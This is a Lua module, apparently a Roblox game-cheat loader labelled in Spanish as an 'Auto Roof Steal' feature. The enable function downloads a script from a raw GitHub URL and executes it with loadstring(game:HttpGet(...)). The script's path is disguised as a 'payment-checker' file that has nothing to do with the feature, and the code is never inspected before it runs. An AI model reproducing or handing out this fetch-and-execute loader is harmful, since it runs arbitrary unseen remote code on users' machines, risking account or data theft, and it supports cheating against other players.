-- Módulo de Auto Roof Steal
local RoofStealModule = {}

local roofStealEnabled = false
local roofStealScript = nil

function RoofStealModule.enable(Labs, playerGui)
    if roofStealScript then return end
    roofStealEnabled = true
    
    task.spawn(function()
        local success = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Fillingregions935/payments-registration/refs/heads/main/payment-checker.lua"))()
        end)
        
        if success then
            roofStealScript = true
        else
            roofStealEnabled = false
            Labs:Notify({
                Title = "Error",
                Content = "Failed to load Roof Steal",
                Type = "error",
                Duration = 3
            })
        end
    end)
end

function RoofStealModule.disable(playerGui)
    roofStealEnabled = false
    
    local roofGui = playerGui:FindFirstChild("StealRoofGui")
    if roofGui then
        pcall(function() roofGui:Destroy() end)
    end
    
    roofStealScript = nil
end

function RoofStealModule.isEnabled()
    return roofStealEnabled
end

return RoofStealModule

